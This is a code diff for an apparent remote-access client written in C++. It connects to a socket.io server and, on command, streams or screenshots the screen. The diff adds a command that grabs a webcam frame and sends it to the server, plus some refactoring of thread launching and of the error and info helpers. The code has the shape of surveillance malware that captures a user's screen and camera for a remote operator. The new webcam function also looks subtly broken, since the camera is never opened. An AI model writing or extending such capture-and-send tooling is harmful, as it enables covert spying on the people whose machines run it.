@@ -23,16 +23,17 @@ namespace silence
     {
         mSocket->off_all();
         mSocket->off_error();
+
+        mLock.lock();
+        mCond.notify_all();
+        mLock.unlock();
     }
 
     void Client::connect()
     {
         mIO->connect(mUrl);
         mLock.lock();
-        if (!connectFinished)
-        {
-            mCond.wait(mLock);
-        }
+        mCond.wait(mLock);
         mLock.unlock();
     }
 
@@ -53,11 +54,19 @@ namespace silence
     }
 
     sio::message::list
-    Client::createObject(const std::map<std::string, sio::message::ptr> &object)
+    Client::createObject(const CommandObject &object)
     {
         auto obj = sio::object_message::create();
         obj.get()->get_map() = object;
         return obj;
+    }
+
+    template <typename T, typename... Args>
+    void Client::launchEvent(const std::function<T> &callable,
+                             Args &&...args)
+    {
+        std::thread thread{callable, args...};
+        thread.detach();
     }
 
     void Client::onCommand(std::string const &name,
@@ -65,36 +74,22 @@ namespace silence
                            bool hasAck,
                            sio::message::list &ack_resp)
     {
+        using namespace std::placeholders;
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
 
         if (event == "greet")
-        {
-            std::thread thread(std::bind(&Client::greetEvent, this));
-            thread.detach();
-        }
+            launchEvent<void()>(std::bind(&Client::greetEvent, this));
         else if (event == "start stream")
-        {
-            std::thread thread(std::bind(&Client::startStreamEvent, this));
-            thread.detach();
-        }
+            launchEvent<void()>(std::bind(&Client::startStreamEvent, this));
         else if (event == "kill stream")
-        {
-            std::thread thread(std::bind(&Client::killStreamEvent, this));
-            thread.detach();
-        }
+            launchEvent<void()>(std::bind(&Client::killStreamEvent, this));
         else if (event == "screenshot")
-        {
-            std::thread thread(std::bind(&Client::screenshotEvent, this));
-            thread.detach();
-        }
+            launchEvent<void()>(std::bind(&Client::screenshotEvent, this));
+        else if (event == "webcamshot")
+            launchEvent<void()>(std::bind(&Client::webcamShotEvent, this));
         else
-        {
-            std::thread thread(std::bind(&Client::errorEvent, this, std::placeholders::_1,
-                                         std::placeholders::_2),
-                               event, "Invalid event");
-            thread.detach();
-        }
+            error(event, "Unknown event");
     }
 
     void Client::greetEvent()
@@ -113,18 +108,34 @@ namespace silence
                       impl::toBinaryString(image));
     }
 
+    void Client::webcamShotEvent()
+    {
+        try
+        {
+            cv::VideoCapture camera;
+            cv::Mat image;
+
+            camera.read(image);
+            mSocket->emit("webcamshot", impl::toBinaryString(image));
+        }
+        catch (cv::Exception &)
+        {
+            error("webcamshot", "No camera found!");
+        }
+    }
+
     void Client::killStreamEvent()
     {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
 
         if (!mStreamRunning)
         {
-            errorEvent("kill stream", "Stream is already killed");
+            error("kill stream", "Stream is already killed");
             return;
         }
 
         mStreamRunning = false;
-        infoEvent("Successfully killed stream");
+        info("Successfully killed stream");
     }
 
     void Client::startStreamEvent()
@@ -147,13 +158,13 @@ namespace silence
         }
     }
 
-    void Client::errorEvent(const std::string &event, const std::string &msg)
+    void Client::error(const std::string &event, const std::string &msg)
     {
         mSocket->emit("error", createObject({{"event", SIOSTR(event)},
                                              {"msg", SIOSTR(msg)}}));
     }
 
-    void Client::infoEvent(const std::string &info)
+    void Client::info(const std::string &info)
     {
         mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
     }
